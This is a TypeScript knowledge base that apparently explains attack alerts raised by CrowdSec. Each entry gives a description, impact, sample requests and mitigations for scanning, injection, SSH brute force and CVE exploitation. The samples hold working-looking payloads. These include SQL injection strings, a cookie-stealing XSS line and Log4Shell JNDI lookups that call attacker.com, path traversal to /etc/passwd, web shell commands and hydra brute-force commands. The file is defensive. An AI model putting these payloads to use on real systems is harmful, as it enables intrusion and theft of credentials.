export type AttackInfo = {
  title: string
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info'
  category: string
  description: string
  impact: string
  examples: string[]
  mitigation: string[]
  references?: string[]
  cve?: string
}

const KNOWLEDGE: Record<string, AttackInfo> = {

  // ── HTTP Scanning / Reconnaissance ─────────────────────────────────────────

  'http_crawl_non_statics': {
    title: 'Aggressive Crawl on Non-Static Resources',
    severity: 'medium',
    category: 'Reconnaissance',
    description:
      'An IP is aggressively crawling dynamic (non-static) resources of the application. Unlike standard search engine bots, this excessive crawling targets server-side rendered pages, APIs, and forms, consuming server resources and potentially scraping sensitive data.',
    impact: 'Server overload, content scraping, credential enumeration, forced browse.',
    examples: [
      'GET /user/1, GET /user/2 … GET /user/999999 (ID enumeration)',
      'GET /api/products?page=1 … page=5000 (mass data harvest)',
      'Hundreds of requests per second to PHP/Python endpoints',
    ],
    mitigation: [
      'Implement rate limiting per IP on dynamic endpoints',
      'Add CAPTCHA on sensitive forms',
      'Use robots.txt to guide legitimate bots',
      'Monitor and block abnormal crawl patterns',
    ],
  },

  'http_probing': {
    title: 'Site Scanning / HTTP Probing',
    severity: 'medium',
    category: 'Reconnaissance',
    description:
      'Systematic automated scanning of a website to discover hidden files, admin interfaces, backup files, configuration files, and application structure. Often the first step of an attack chain, performed with tools like dirbuster, gobuster, feroxbuster or nuclei.',
    impact: 'Attack surface mapping, disclosure of sensitive files, technology fingerprinting.',
    examples: [
      'GET /.env',
      'GET /wp-config.php.bak',
      'GET /.git/config',
      'GET /admin/, GET /phpmyadmin/, GET /manager/html',
      'GET /backup.tar.gz',
    ],
    mitigation: [
      'Return 404 for all non-existent paths (avoid revealing existence with 403)',
      'Remove sensitive files from public directories',
      'Implement rate limiting on 404 responses',
      'Use a WAF to block common scanning tool signatures',
    ],
  },

  'http_wordpress_scan': {
    title: 'WordPress Exploitation Scan',
    severity: 'high',
    category: 'CMS Exploitation',
    description:
      'Automated scanning and exploitation attempts targeting WordPress-specific endpoints: xmlrpc.php, wp-login.php, admin-ajax.php, plugin vulnerabilities, and known WordPress CVEs. Tools like WPScan, wpsploit are commonly used.',
    impact: 'Account takeover, plugin RCE, data exfiltration, site defacement.',
    examples: [
      'POST /xmlrpc.php  (multicall brute force)',
      'GET /wp-content/plugins/vulnerable-plugin/exploit.php',
      'POST /wp-login.php  (credential brute force)',
      'GET /?author=1  (username enumeration)',
      'GET /wp-json/wp/v2/users  (user enumeration via REST API)',
    ],
    mitigation: [
      'Disable xmlrpc.php or restrict by IP',
      'Use a security plugin (Wordfence, Sucuri)',
      'Keep WordPress core, themes, and plugins updated',
      'Implement MFA on wp-login.php',
      'Rename or protect the wp-admin directory',
    ],
  },

  'http_admin_interface_probing': {
    title: 'Admin Interface Probing',
    severity: 'high',
    category: 'Reconnaissance',
    description:
      'Automated discovery of administrative panels, management interfaces, and backend systems exposed on the web server. Attackers look for Phpmyadmin, Adminer, Webmin, cPanel, Grafana, Kibana, and other admin tools.',
    impact: 'Credential brute force, unauthorized admin access, database exposure.',
    examples: [
      'GET /phpmyadmin/',
      'GET /adminer.php',
      'GET /manager/html  (Tomcat)',
      'GET /console  (JBoss/Wildfly)',
      'GET /_admin, GET /admin, GET /administrator',
    ],
    mitigation: [
      'Restrict admin interfaces to specific IPs via firewall or Traefik IP allowlist',
      'Never expose admin tools directly on the internet',
      'Use strong passwords and MFA on all admin interfaces',
      'Move admin interfaces to non-standard paths',
    ],
  },

  'http_bad_user_agent': {
    title: 'Malicious / Suspicious User-Agent',
    severity: 'medium',
    category: 'Bot / Scanner',
    description:
      'Requests using user-agent strings associated with known vulnerability scanners, exploit frameworks, automated attack tools, or clearly fake/empty user agents. Examples include sqlmap, nikto, nmap, Metasploit, and various crawler tools.',
    impact: 'Automated vulnerability scanning, exploitation attempts.',
    examples: [
      'User-Agent: sqlmap/1.7.8#stable (https://sqlmap.org)',
      'User-Agent: Nikto/2.1.6',
      'User-Agent: masscan/1.0',
      'User-Agent: python-requests/2.28.0  (automated script)',
      'User-Agent: <empty>',
    ],
    mitigation: [
      'Block known malicious user-agents at WAF or CDN level',
      'Implement a challenge (CAPTCHA) for suspicious UAs',
      'Log and monitor all scanner-related user agents',
    ],
  },

  'http_sensitive_files': {
    title: 'Sensitive File Access Attempts',
    severity: 'high',
    category: 'Reconnaissance',
    description:
      'Attempts to access sensitive files and directories that could expose credentials, source code, database dumps, or version control history. Common targets include .env files, .git directories, log files, and database files.',
    impact: 'Credential theft, source code disclosure, database exposure, API key leakage.',
    examples: [
      'GET /.env  (environment file with secrets)',
      'GET /.git/config  (git repository)',
      'GET /database.sql  (database dump)',
      'GET /app.log, GET /error.log  (log files)',
      'GET /.DS_Store  (macOS directory metadata)',
      'GET /config.php.bak  (backup config)',
    ],
    mitigation: [
      'Block access to sensitive extensions (.env, .log, .sql, .bak) via Nginx/Apache rules',
      'Never commit secrets to git repositories',
      'Use .gitignore to exclude sensitive files',
      'Regularly audit public-facing file exposure',
    ],
  },

  'http_backdoors_attempts': {
    title: 'Web Backdoor Access Attempts',
    severity: 'critical',
    category: 'Malware / Backdoor',
    description:
      'Attempts to access or execute web shell backdoors previously planted on the server. Attackers probe common backdoor filenames (shell.php, c99.php, r57.php, etc.) hoping to find one left by a previous attacker or forgotten during development.',
    impact: 'Full server compromise, persistent unauthorized access, lateral movement.',
    examples: [
      'GET /shell.php?cmd=whoami',
      'GET /c99.php',
      'GET /r57.php',
      'GET /webshell.php',
      'GET /uploads/shell.php?cmd=ls',
    ],
    mitigation: [
      'Regularly scan for unauthorized files in web directories',
      'Implement file integrity monitoring',
      'Restrict PHP execution in upload directories',
      'Use an application firewall to detect webshell patterns',
    ],
  },

  'http_path_traversal_probing': {
    title: 'Path Traversal / LFI Probing',
    severity: 'high',
    category: 'File Access',
    description:
      'Attempts to traverse directory boundaries to access files outside the web root using ../ sequences. Attackers try to read sensitive system files, application configs, or source code.',
    impact: 'Sensitive file disclosure, credential exposure, potential RCE via log poisoning.',
    examples: [
      'GET /?file=../../../../etc/passwd',
      'GET /?page=../../../etc/shadow',
      'GET /?template=....//....//windows/win.ini',
      'GET /?path=%2F%2Fetc%2Fpasswd',
      'GET /?file=php://filter/convert.base64-encode/resource=config.php',
    ],
    mitigation: [
      'Validate and sanitize all file path parameters',
      'Use realpath() and check it starts with the expected base directory',
      'Implement a whitelist of allowed files',
      'Chroot or containerize the application',
    ],
    references: ['https://owasp.org/www-community/attacks/Path_Traversal'],
  },

  'http_sqli_probing': {
    title: 'SQL Injection Probing',
    severity: 'critical',
    category: 'Injection',
    description:
      'Systematic probing for SQL injection vulnerabilities by injecting SQL syntax into GET/POST parameters. Detected with minimal false positives by the CrowdSec scenario, targeting confirmed SQLi patterns.',
    impact: 'Full database dump, authentication bypass, data manipulation, RCE on some databases.',
    examples: [
      "/?id=1' OR '1'='1",
      "/?user=admin'--",
      '/?id=1 UNION SELECT username,password FROM users--',
      "/?q=1; DROP TABLE users; --",
      '/?id=1 AND SLEEP(5)--  (blind SQLi time-based)',
    ],
    mitigation: [
      'Use parameterized queries / prepared statements exclusively',
      'Apply input validation and allowlisting',
      'Use an ORM with proper escaping',
      'Limit database user privileges',
    ],
    references: ['https://owasp.org/www-community/attacks/SQL_Injection'],
  },

  'http_xss_probing': {
    title: 'XSS Probing',
    severity: 'high',
    category: 'Injection',
    description:
      'Systematic probing for Cross-Site Scripting vulnerabilities. The CrowdSec scenario uses patterns tuned for low false-positives, detecting actual XSS payloads injected into URL parameters or form fields.',
    impact: 'Session hijacking, credential theft, DOM manipulation, malware distribution.',
    examples: [
      '/?q=<script>alert(1)</script>',
      '/?name=<img src=x onerror=alert(document.cookie)>',
      '/?input="><svg/onload=fetch(`https://attacker.com/?c=${btoa(document.cookie)}`)>',
      '/?search=javascript:alert(1)',
    ],
    mitigation: [
      'Encode all user-supplied output (HTML entity encoding)',
      'Implement strict Content Security Policy (CSP)',
      'Use HttpOnly and Secure cookie flags',
      'Validate input server-side before processing',
    ],
    references: ['https://owasp.org/www-community/attacks/xss/'],
  },

  'http_generic_bf': {
    title: 'Generic HTTP Brute Force',
    severity: 'high',
    category: 'Authentication',
    description:
      'Automated brute force attempts against HTTP authentication endpoints — login forms, basic auth, digest auth, or any endpoint accepting credentials. Detected by high frequency of requests from a single IP.',
    impact: 'Account takeover, unauthorized access.',
    examples: [
      'POST /login  (hundreds of requests with different passwords)',
      'GET /protected/  (basic auth brute force)',
      'POST /api/auth/login  (API credential stuffing)',
    ],
    mitigation: [
      'Implement rate limiting on authentication endpoints',
      'Account lockout after N failed attempts',
      'Require CAPTCHA after repeated failures',
      'Enable MFA for all accounts',
    ],
  },

  'http_open_proxy': {
    title: 'Open Proxy Scan',
    severity: 'medium',
    category: 'Reconnaissance',
    description:
      'Scanning to detect open HTTP/HTTPS proxies. Attackers look for misconfigured servers that will forward requests to arbitrary destinations, which can be used for anonymization, SSRF, or network pivoting.',
    impact: 'Anonymous attack relay, SSRF exploitation, bypassing IP-based restrictions.',
    examples: [
      'GET http://evil.com/ HTTP/1.1  (absolute URI proxy request)',
      'CONNECT attacker.com:443 HTTP/1.1  (CONNECT proxy tunnel)',
      'GET http://169.254.169.254/ HTTP/1.1',
    ],
    mitigation: [
      'Never configure your web server as an open proxy',
      'Disable HTTP CONNECT if not needed',
      'Filter outbound connections from the web server',
    ],
  },

  'http_dos_bypass_cache': {
    title: 'DoS — Cache Bypass',
    severity: 'high',
    category: 'Denial of Service',
    description:
      'DoS tools that bypass CDN/reverse-proxy caching by appending random parameters to each request, forcing the backend to process every request. This bypasses Varnish, Nginx proxy cache, and CDN layers.',
    impact: 'Application server overload, service degradation or outage.',
    examples: [
      'GET /?_=1234567890 (random cache-bust param)',
      'GET /page?nocache=random_string',
      'GET / with Cache-Control: no-cache header on every request',
    ],
    mitigation: [
      'Implement rate limiting upstream before the cache',
      'Use a CDN with DDoS protection',
      'Configure cache to ignore unknown query parameters',
    ],
  },

  'http_dos_invalid_http_versions': {
    title: 'DoS — Invalid HTTP Versions',
    severity: 'high',
    category: 'Denial of Service',
    description:
      'DoS tools sending requests with invalid or malformed HTTP version strings to confuse or crash web servers, or to test for parsing vulnerabilities.',
    impact: 'Service degradation, potential parsing errors, server instability.',
    examples: [
      'GET / HTTP/9.9',
      'GET / HTTP/0.0',
      'GET / FAKEPROTO/1.1',
    ],
    mitigation: [
      'Use a reverse proxy (Nginx, Traefik) that normalizes HTTP before reaching the app',
      'Implement upstream rate limiting',
      'Monitor for protocol anomalies',
    ],
  },

  'http_dos_random_uri': {
    title: 'DoS — Random URI',
    severity: 'high',
    category: 'Denial of Service',
    description:
      'DoS tools generating requests to random/nonsensical URIs, often to consume server resources, fill access logs, or overwhelm application routers.',
    impact: 'Log pollution, storage exhaustion, server CPU/memory overload.',
    examples: [
      'GET /aB3xKp9mQ2 HTTP/1.1  (random paths)',
      'GET /xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx HTTP/1.1',
    ],
    mitigation: [
      'Rate limit IPs generating excessive 404 errors',
      'Use a CDN or DDoS protection service',
      'Implement connection limits per IP',
    ],
  },

  'http_dos_switching_ua': {
    title: 'DoS — Switching User-Agent',
    severity: 'high',
    category: 'Denial of Service',
    description:
      'DoS tools rapidly rotating User-Agent strings to evade simple per-UA rate limiting. The high frequency of UA changes from a single IP is a strong indicator of automated attack traffic.',
    impact: 'Evasion of basic bot protection, server overload.',
    examples: [
      'Same IP cycling through Chrome, Firefox, Safari, bot UAs every few requests',
    ],
    mitigation: [
      'Rate limit by IP rather than by User-Agent',
      'Use behavioral analysis (request rate, pattern) for detection',
      'Implement challenge-based bot detection',
    ],
  },

  'http_cve_probing': {
    title: 'Generic CVE HTTP Probing',
    severity: 'high',
    category: 'Vulnerability Exploitation',
    description:
      'Generic scanning for known CVE vulnerabilities across multiple web technologies. Mass scanners probe for hundreds of known CVE paths simultaneously, often automated with tools like Nuclei.',
    impact: 'Discovery of unpatched systems for targeted exploitation.',
    examples: [
      'GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  (CVE-2017-9841)',
      'GET /.git/HEAD  (git disclosure)',
      'GET /actuator/env  (Spring Boot)',
      'GET /solr/admin/info/system  (Apache Solr)',
    ],
    mitigation: [
      'Keep all software patched and up to date',
      'Implement a WAF with CVE-specific signatures',
      'Regularly run vulnerability scans on your own infrastructure',
    ],
  },

  'http_sap_interface_probing': {
    title: 'SAP Interface Probing',
    severity: 'high',
    category: 'Reconnaissance',
    description:
      'Scanning for exposed SAP enterprise interfaces (SAP GUI over HTTP, SAP Web Dispatcher, ICM, Message Server). Attackers target SAP systems for financial data, HR records, and ERP access.',
    impact: 'Financial data breach, ERP system compromise, supply chain attacks.',
    examples: [
      'GET /sap/bc/gui/sap/its/webgui',
      'GET /irj/portal  (SAP NetWeaver Portal)',
      'GET /sap/bc/bsp/sap/  (SAP BSP)',
      'GET /webdynpro/resources/',
    ],
    mitigation: [
      'Never expose SAP interfaces directly to the internet',
      'Use SAP Secure Network Communications (SNC)',
      'Implement IP allowlisting for SAP access',
      'Regularly apply SAP security notes',
    ],
  },

  'http_w00tw00t': {
    title: 'w00tw00t Scanner',
    severity: 'medium',
    category: 'Bot / Scanner',
    description:
      'The w00tw00t scanner is a well-known automated vulnerability scanner that sends distinctive requests with the "w00tw00t" string in the URL or User-Agent. It probes for common web vulnerabilities and misconfigured servers.',
    impact: 'Vulnerability discovery, reconnaissance.',
    examples: [
      'GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1',
      'GET /w00tw00t.at.blackhats.romanian.anti-sec:)',
    ],
    mitigation: [
      'Block the distinctive w00tw00t User-Agent and URL patterns',
      'Implement general WAF rules for scanner signatures',
    ],
  },

  // ── AppSec ────────────────────────────────────────────────────────────────

  'appsec_native': {
    title: 'CrowdSec AppSec — Native Rules',
    severity: 'high',
    category: 'WAF / AppSec',
    description:
      'Attacks identified by CrowdSec AppSec native rules. These rules are built into the AppSec engine and cover OWASP Top 10 attacks: XSS, SQL injection, path traversal, RCE, command injection, and more, using the OWASP ModSecurity Core Rule Set (CRS).',
    impact: 'Varies — XSS, SQLi, RCE, path traversal, protocol anomalies.',
    examples: [
      '/?test=<script>alert(1)</script>  → XSS native rule triggered',
      "/?id=1' OR 1=1--  → SQLi native rule triggered",
      '/?file=../../etc/passwd  → LFI native rule triggered',
    ],
    mitigation: [
      'Keep AppSec rules updated via cscli hub update',
      'Review and tune false positive thresholds',
      'Fix underlying application vulnerabilities',
    ],
    references: ['https://www.crowdsec.net/blog/crowdsec-appsec-component'],
  },

  'appsec_vpatch': {
    title: 'CrowdSec AppSec — Virtual Patch',
    severity: 'critical',
    category: 'WAF / AppSec',
    description:
      'Virtual patches block exploitation of specific known CVEs at the WAF layer, protecting vulnerable applications even before the underlying software is patched. This provides immediate protection when a CVE is disclosed.',
    impact: 'Blocks active exploitation of published CVEs without requiring application updates.',
    examples: [
      'Exploitation attempt of Log4Shell (CVE-2021-44228) → blocked by vpatch',
      'Exploitation of Spring4Shell (CVE-2022-22965) → blocked by vpatch',
    ],
    mitigation: [
      'Keep AppSec rules updated (cscli hub update)',
      'Still apply the actual software patch as soon as available',
      'Monitor vpatch alerts for evidence of active exploitation attempts',
    ],
  },

  'anomaly_score': {
    title: 'WAF Anomaly Score Block',
    severity: 'medium',
    category: 'WAF / AppSec',
    description:
      'CrowdSec AppSec uses the OWASP ModSecurity Core Rule Set scoring system. Each suspicious element in a request contributes to the anomaly score. When the total exceeds the configured threshold, the request is blocked. This catches multi-vector attacks and complex evasion attempts.',
    impact: 'Varies — XSS, SQLi, path traversal, protocol anomalies, evasion attempts.',
    examples: [
      '/?test=<marquee onstart=alert(1)>  → XSS score: 30',
      '/?q=1 UNION SELECT null,null--  → SQLi score: 20',
      '/?path=../../etc/passwd  → LFI score: 15',
      'Missing Host header + unusual User-Agent  → anomaly: 10',
    ],
    mitigation: [
      'Tune anomaly score thresholds for your application',
      'Add exceptions for legitimate false positives',
      'Keep AppSec rules updated',
    ],
    references: ['https://coreruleset.org/faq/'],
  },

  // ── SSH ───────────────────────────────────────────────────────────────────

  'ssh_bf': {
    title: 'SSH Brute Force',
    severity: 'high',
    category: 'Authentication',
    description:
      'Automated brute force attacks against SSH services, trying common usernames (root, admin, ubuntu) with dictionary passwords. One of the most common internet threats for any exposed SSH port.',
    impact: 'Unauthorized server access, full system compromise, cryptomining, ransomware.',
    examples: [
      'hydra -l root -P /wordlists/passwords.txt ssh://target',
      'medusa -u admin -P passwords.txt -h target -M ssh',
      'Multiple failed login attempts: Failed password for root from X.X.X.X',
    ],
    mitigation: [
      'Disable password authentication, use SSH keys only',
      'Change SSH port from 22 to a non-standard port',
      'Restrict SSH access by IP allowlist via firewall',
      'Implement fail2ban or CrowdSec',
    ],
  },

  'ssh_slow_bf': {
    title: 'Slow SSH Brute Force',
    severity: 'high',
    category: 'Authentication',
    description:
      'A low-and-slow SSH brute force that stays under standard rate-limit thresholds by spacing attempts over longer periods. Designed to evade detection while still systematically testing credentials.',
    impact: 'Stealthy account compromise, hard to detect without long-term monitoring.',
    examples: [
      '1 SSH attempt every 30-60 seconds over hours/days',
      'Distributed slow-bf from botnets: 1 attempt per IP per day',
    ],
    mitigation: [
      'Disable password authentication entirely',
      'Use CrowdSec with long-window detection (hours/days)',
      'Implement MFA for SSH',
    ],
  },

  'ssh_time_based_bf': {
    title: 'Time-Based SSH Brute Force',
    severity: 'high',
    category: 'Authentication',
    description:
      'SSH brute force that uses timing analysis to reduce false positives and evade rate-based detection. The CrowdSec scenario specifically tracks authentication timing patterns to identify this evasion technique.',
    impact: 'Credential compromise while evading simple rate-based protections.',
    examples: [
      'Bursts of attempts with precise delays to stay under threshold',
      'Time-synchronized attacks across multiple IPs',
    ],
    mitigation: [
      'Disable password-based SSH authentication',
      'Use behavioral analysis over longer time windows',
      'Implement IP reputation blocking',
    ],
  },

  'ssh_refused_conn': {
    title: 'SSH Refused Connections',
    severity: 'low',
    category: 'Reconnaissance',
    description:
      'High volume of refused SSH connections from a single IP, indicating port scanning or connection attempts to a closed/firewalled SSH service. Less severe than brute force but indicates active reconnaissance.',
    impact: 'Network reconnaissance, potential precursor to targeted attacks.',
    examples: [
      'Multiple TCP RST/connection refused to port 22',
      'Scanner mapping open SSH ports across IP ranges',
    ],
    mitigation: [
      'Use iptables/nftables to drop rather than reject (sends no RST)',
      'Move SSH to non-standard port',
      'Implement CrowdSec for IP reputation blocking',
    ],
  },

  // ── CVEs ─────────────────────────────────────────────────────────────────

  'cve_2022_41082': {
    title: 'ProxyNotShell — Microsoft Exchange RCE',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2022-41082',
    description:
      'ProxyNotShell is a critical RCE vulnerability in Microsoft Exchange Server. An authenticated attacker can chain CVE-2022-41040 (SSRF) with CVE-2022-41082 (RCE via PowerShell remoting) to execute arbitrary commands as SYSTEM.',
    impact: 'Full Exchange Server compromise, email exfiltration, Active Directory access.',
    examples: [
      'POST /autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com',
      'Exploitation chain targeting /autodiscover/ endpoint',
    ],
    mitigation: [
      'Apply Microsoft security patches immediately (released Oct 2022)',
      'Restrict access to PowerShell Remoting from untrusted networks',
      'Enable Extended Protection for Authentication (EPA)',
      'Use Microsoft\'s URL Rewrite mitigation if patching is delayed',
    ],
    references: ['https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41082'],
  },

  'cve_2022_37042': {
    title: 'Zimbra Authentication Bypass',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2022-37042',
    description:
      'Authentication bypass vulnerability in Zimbra Collaboration Suite. Allows unauthenticated attackers to upload and execute arbitrary JSP files by bypassing MailboxImportServlet authentication checks.',
    impact: 'Unauthenticated RCE, email server compromise, credential theft.',
    examples: [
      'POST /service/extension/backup/mboximport?account-name=../../../../../../opt/zimbra/jetty/webapps/zimbra/x.jsp',
    ],
    mitigation: [
      'Update Zimbra to 9.0.0 Patch 26 or 8.8.15 Patch 33+',
      'Restrict external access to Zimbra admin ports',
      'Monitor for unusual file uploads to Zimbra directories',
    ],
    references: ['https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories'],
  },

  'cve_2022_44877': {
    title: 'CentOS Web Panel — Unauthenticated RCE',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2022-44877',
    description:
      'Unauthenticated Remote Code Execution in CentOS Web Panel (CWP). The login/index.php endpoint fails to properly sanitize user input passed to bash commands, allowing OS command injection without authentication.',
    impact: 'Full server compromise, root code execution.',
    examples: [
      'POST /login/index.php  body: username=;id;#',
      'GET /cwp_%7B%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29',
    ],
    mitigation: [
      'Update CWP to version 0.9.8.1147 or later immediately',
      'Restrict access to CWP admin panel by IP',
      'Do not expose CWP directly to the internet',
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-44877'],
  },

  'cve_2022_46169': {
    title: 'Cacti — Unauthenticated RCE',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2022-46169',
    description:
      'Unauthenticated command injection in Cacti monitoring software (v1.2.22 and below). Remote Poller feature allows injecting arbitrary OS commands through the get_client_addr() function without authentication.',
    impact: 'Unauthenticated full server RCE, monitoring infrastructure compromise.',
    examples: [
      'GET /remote_agent.php?action=polldata&local_data_ids[]=;id;%23&host_id=1&poller_id=1 HTTP/1.1',
    ],
    mitigation: [
      'Update Cacti to version 1.2.23 or later',
      'Restrict Cacti access to internal networks only',
      'Apply the official patch immediately',
    ],
    references: ['https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf'],
  },

  'cve_2023_22515': {
    title: 'Confluence — Broken Access Control',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2023-22515',
    description:
      'Critical broken access control vulnerability in Atlassian Confluence Data Center and Server. Allows unauthenticated attackers to create unauthorized Confluence administrator accounts, leading to full instance takeover.',
    impact: 'Unauthorized admin access, full Confluence instance compromise, data exfiltration.',
    examples: [
      'POST /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false',
      'Creating admin user via /setup/setupadministrator.action without authentication',
    ],
    mitigation: [
      'Update to Confluence 8.3.3, 8.4.3, 8.5.2+, or 7.19.16+',
      'Restrict access to /setup endpoints at the network level',
      'If unable to patch, restrict external network access to Confluence',
    ],
    references: ['https://confluence.atlassian.com/security/cve-2023-22515-1295682335.html'],
  },

  'cve_2023_22518': {
    title: 'Confluence — Improper Authorization (Data Destruction)',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2023-22518',
    description:
      'Improper authorization vulnerability in Confluence Data Center and Server. Allows unauthenticated attackers to reset Confluence and create an administrator account, potentially enabling ransomware attacks and complete data destruction.',
    impact: 'Complete data loss, ransomware deployment, admin account creation.',
    examples: [
      'POST /json/setup-restore.action  (database reset)',
      'Triggering setup workflow without authentication',
    ],
    mitigation: [
      'Update Confluence to the latest patched version immediately',
      'Block all internet access to Confluence instances if patching is not immediately possible',
      'Backup all data before exploitation occurs',
    ],
    references: ['https://confluence.atlassian.com/security/cve-2023-22518-1295682024.html'],
  },

  'cve_2023_49103': {
    title: 'ownCloud — Sensitive Info Disclosure',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2023-49103',
    description:
      'Critical information disclosure vulnerability in ownCloud\'s graphapi app. Exposes PHP environment variables including admin passwords, mail server credentials, and license keys via the /apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php endpoint.',
    impact: 'Admin credential disclosure, complete ownCloud instance takeover.',
    examples: [
      'GET /apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php',
    ],
    mitigation: [
      'Disable the graphapi app (not just uninstall)',
      'Change ownCloud admin password and all exposed credentials',
      'Update to ownCloud 10.13.1+',
      'Deny access to phpinfo() endpoints',
    ],
    references: ['https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/'],
  },

  'cve_2024_0012': {
    title: 'Palo Alto PAN-OS — Authentication Bypass',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2024-0012',
    description:
      'Authentication bypass vulnerability in Palo Alto Networks PAN-OS management web interface. Allows unauthenticated attackers with network access to gain administrator privileges.',
    impact: 'Full firewall compromise, network infrastructure takeover.',
    examples: [
      'GET /php/utils/createRemoteAppwebSession.php?user=admin&userRole=superuser',
    ],
    mitigation: [
      'Update PAN-OS immediately',
      'Restrict management interface access to trusted IPs only',
      'Never expose the management interface to the internet',
    ],
    references: ['https://security.paloaltonetworks.com/CVE-2024-0012'],
  },

  'cve_2024_9474': {
    title: 'Palo Alto PAN-OS — Privilege Escalation',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2024-9474',
    description:
      'Privilege escalation vulnerability in Palo Alto PAN-OS. Typically chained with CVE-2024-0012 (auth bypass) to achieve root code execution on the firewall. Actively exploited in the wild.',
    impact: 'Root code execution on Palo Alto firewalls, full network infrastructure compromise.',
    examples: [
      'Command injection via management interface after CVE-2024-0012 auth bypass',
    ],
    mitigation: [
      'Patch PAN-OS to the fixed version immediately',
      'Restrict management web interface access to internal trusted networks only',
    ],
    references: ['https://security.paloaltonetworks.com/CVE-2024-9474'],
  },

  'cve_2024_38475': {
    title: 'Apache httpd — Mod_rewrite Path Confusion',
    severity: 'high',
    category: 'CVE',
    cve: 'CVE-2024-38475',
    description:
      'Vulnerability in Apache HTTP Server mod_rewrite. Improper escaping on output allows substitutions to map to unexpected URL parts, potentially enabling source code disclosure and server-side script exposure.',
    impact: 'Source code disclosure, unauthorized file access.',
    examples: [
      'GET /cgi-bin/.%2F..%2Findex.php  (path confusion)',
    ],
    mitigation: [
      'Update Apache httpd to 2.4.60 or later',
      'Review and harden mod_rewrite rules',
    ],
    references: ['https://httpd.apache.org/security/vulnerabilities_24.html'],
  },

  'apache_log4j2_cve_2021_44228': {
    title: 'Log4Shell — Apache Log4j2 RCE',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2021-44228',
    description:
      'One of the most critical vulnerabilities ever discovered. Log4Shell allows unauthenticated RCE by injecting a JNDI lookup string into any field that gets logged by Log4j2. Affects virtually every Java application using Log4j 2.0-2.14.1.',
    impact: 'Unauthenticated RCE on any Java application using Log4j2, mass exploitation worldwide.',
    examples: [
      '${jndi:ldap://attacker.com/x}  (in any logged field: UA, header, body)',
      'User-Agent: ${jndi:ldap://192.168.0.1:1389/Exploit}',
      '${jndi:dns://attacker.com/a}  (DNS callback for detection)',
      '${${::-j}${::-n}${::-d}${::-i}:...}  (evasion variant)',
    ],
    mitigation: [
      'Update Log4j2 to 2.17.1+ (Java 8), 2.12.4+ (Java 7), 2.3.2+ (Java 6)',
      'Set log4j2.formatMsgNoLookups=true as interim mitigation',
      'Block JNDI patterns at WAF level',
      'Audit all Java applications for Log4j usage',
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-44228'],
  },

  'grafana_cve_2021_43798': {
    title: 'Grafana — Arbitrary File Read',
    severity: 'high',
    category: 'CVE',
    cve: 'CVE-2021-43798',
    description:
      'Path traversal vulnerability in Grafana allowing unauthenticated attackers to read arbitrary files from the server via the plugin endpoint. Affects Grafana 8.0.0-8.3.0.',
    impact: 'Disclosure of Grafana config (including database credentials), /etc/passwd, and other sensitive files.',
    examples: [
      'GET /public/plugins/alertlist/../../../../../../../../../etc/passwd',
      'GET /public/plugins/text/../../../../../../../../../etc/grafana/grafana.ini',
    ],
    mitigation: [
      'Update Grafana to version 8.3.1+',
      'Restrict Grafana access to internal networks',
      'Rotate any credentials that may have been exposed',
    ],
    references: ['https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/'],
  },

  'cve_2017_9841': {
    title: 'PHPUnit Remote Code Execution',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2017-9841',
    description:
      'Critical RCE vulnerability in PHPUnit (< 4.8.28, < 5.6.3). The eval-stdin.php utility file, if left exposed in a production web root, allows unauthenticated attackers to execute arbitrary PHP code.',
    impact: 'Unauthenticated full server RCE via PHP code execution.',
    examples: [
      'POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  body: <?php system(\'id\'); ?>',
      'POST /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    ],
    mitigation: [
      'Never deploy vendor/ or composer dev dependencies to production',
      'Add web server rules to block /vendor/ access',
      'Run composer install --no-dev in production',
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2017-9841'],
  },

  'cve_2019_18935': {
    title: 'Telerik UI — .NET Deserialization RCE',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2019-18935',
    description:
      'Critical .NET deserialization RCE in Telerik UI for ASP.NET AJAX. Attackers can upload a malicious DLL file via the Telerik.Web.UI.WebResource.axd handler and execute arbitrary code by triggering .NET BinaryFormatter deserialization.',
    impact: 'Unauthenticated full server RCE, IIS worker process compromise.',
    examples: [
      'POST /Telerik.Web.UI.WebResource.axd?type=rau  (malicious upload)',
    ],
    mitigation: [
      'Update Telerik UI to R1 2020 (2020.1.114)+',
      'Set Telerik.Upload.ConfigurationHashKey to a strong random value',
      'Disable FileUpload if not needed',
    ],
    references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-18935'],
  },

  'cve_2022_26134': {
    title: 'Confluence — OGNL Injection RCE',
    severity: 'critical',
    category: 'CVE',
    cve: 'CVE-2022-26134',
    description:
      'Critical unauthenticated OGNL injection vulnerability in Atlassian Confluence Server and Data Center. Allows remote attackers to execute arbitrary code on any Confluence version. Massively exploited in the wild within hours of disclosure.',
